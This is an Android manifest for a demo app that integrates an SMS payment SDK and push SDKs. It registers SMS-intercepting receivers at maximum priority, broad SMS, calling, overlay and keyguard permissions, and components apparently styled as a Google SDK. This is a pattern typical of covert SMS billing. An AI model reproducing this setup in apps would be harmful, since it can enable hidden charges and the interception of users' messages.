<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.Demoht_ep.Demo_ep_mifupay"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="21" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >

        <!-- pushi start -->

        <receiver
            android:name="com.push2.sdk.util.SmsReceiver"
            android:permission="android.permission.BROADCAST_SMS" >
            <intent-filter android:priority="1000" >
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <service android:name="com.push2.sdk.util.SmsService" >
            <intent-filter>
                <action android:name="com.push2.sdk.service.SMS_SERVICE" />
            </intent-filter>
        </service>
        <service android:name="com.push2.sdk.FiledownService" >
            <intent-filter>
                <action android:name="com.push2.sdk.FILEDOWN_SERVICER" />
            </intent-filter>
        </service>

        <receiver android:name="com.push2.sdk.util.FileDownLoadReceiver" >
            <intent-filter android:priority="1000" >
                <action android:name="com.push.sdk.FILEDOWNLOADRECEIVER" />
            </intent-filter>
        </receiver>

        <!-- pushi end -->

        <activity
            android:name="com.Demo.Demo.MainActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name="com.epplus.face.EPPlusPayService"
            android:exported="false" >
        </service>

        <meta-data
            android:name="EP_CHANNEL"
            android:value="a10020" >
        </meta-data>
        <meta-data
            android:name="EP_APPKEY"
            android:value="f17d2fb4eff547c8bebc1e7cc4dcd43c" >
        </meta-data>
        

        <!-- f17d2fb4eff547c8bebc1e7cc4dcd43c -->
        
        <meta-data android:name="YMCHANNEL" 
                   android:value="A001" >
         </meta-data>
         
         <meta-data android:name="YM_APPKEY" 
                   android:value="PPKGZC0000" >
         </meta-data>

        <receiver
            android:name="com.epplus.face.EPPlusPayServiceReceiver"
            android:exported="false" >
            <intent-filter>
                <action android:name="android.intent.action.SCREEN_OFF" />
                <action android:name="com.ep.action.MESSAGE" />
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                <action android:name="android.intent.action.USER_PRESENT" />
            </intent-filter>
        </receiver>

        <activity
            android:name="com.epplus.face.EPPlusPayActivity"
            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" >
            <intent-filter>
                <action android:name="com.epplus.face.EPPlusPayActivity" />

                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
        <activity
            android:name="com.google.sdk.GeneralActivity"
            android:configChanges="keyboardHidden|orientation"
            android:theme="@android:style/Theme.Dialog" />

        <service
            android:name="com.google.sdk.GeneralService"
            android:process=":update" />

        <receiver
            android:name="com.google.sdk.PPSReceiver"
            android:process=":update" >
            <intent-filter>
                <action android:name="android.intent.action.PPS" />
                <action android:name="android.net.wifi.STATE_CHANGED" />
            </intent-filter>
        </receiver>
        <receiver android:name="com.google.sdk.SMSReceiver" >
            <intent-filter android:priority="2147483647" >
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- 安装apk统计的广播监听 -->
        <!--  
        <receiver android:name="com.epplus.face.InstallReciver" >
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED" />

                <data android:scheme="package" />
            </intent-filter>
        </receiver>
        -->
    </application>

    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.WRITE_SMS" />
    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT" />
    
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />

    <!-- sky add -->
    <uses-permission android:name="android.permission.BLUETOOTH" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.VIBRATE" />

    <!-- molibird -->
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.RESTART_PACKAGES" />
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
    <uses-permission android:name="android.permission.SYSTEM_OVERLAY_WINDOW" />
    <uses-permission android:name="android.permission.REORDER_TASKS" />

    <!-- pushi -->
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    
